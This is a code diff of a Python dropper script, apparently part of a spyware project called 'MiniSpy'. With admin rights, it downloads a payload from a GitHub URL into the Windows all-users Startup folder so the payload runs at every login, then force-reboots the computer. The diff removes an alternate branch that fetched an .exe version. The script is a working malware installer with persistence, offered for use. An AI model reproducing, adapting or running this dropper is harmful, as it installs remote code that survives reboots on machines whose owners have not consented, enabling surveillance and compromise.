@@ -17,9 +17,6 @@ import sys  # For admin access
 # Get important variables
 target_path = 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/'  # Python does not like forward slashes
 payload_url = 'https://raw.githubusercontent.com/mastermind-0010/MiniSpy/main/MiniSpy_Payload.py'
-payload_exe = 'https://github.com/mastermind-0010/MiniSpy/blob/main/MiniSpy_Payload.exe?raw=true'
-exe = False  # IMPORTANT: Change this to True if you want the exe not the pyw
-
 
 # -------------------------------------------------------------------------------
 # IMPORTANT NOT MY CODE:
@@ -42,30 +39,15 @@ else:
     sys.exit()
 # -------------------------------------------------------------------------------
 
-if not exe:
-    # Open the file
-    payload = open(target_path + 'MiniSpy_Payload.pyw', 'w+')
+# Open the file
+payload = open(target_path + 'MiniSpy_Payload.pyw', 'w+')
 
-    # Get the payload code from internet
-    request = requests.get(payload_url)
-    payload.write(request.text)
+# Get the payload code from internet
+request = requests.get(payload_url)
+payload.write(request.text)
 
-    # Close the file
-    payload.close()
+# Close the file
+payload.close()
 
-    # OPTIONAL: Reboot the computer
-    os.system('shutdown /r /f')
-
-if exe:
-    # Open the file
-    payload = open(target_path + 'MiniSpy_Payload.exe', 'wb')
-
-    # Get the payload code from internet
-    request = requests.get(payload_exe)
-    payload.write(request.content)
-
-    # Close the file
-    payload.close()
-
-    # OPTIONAL: Reboot the computer
-    os.system('shutdown /r /f')
+# OPTIONAL: Reboot the computer
+os.system('shutdown /r /f')
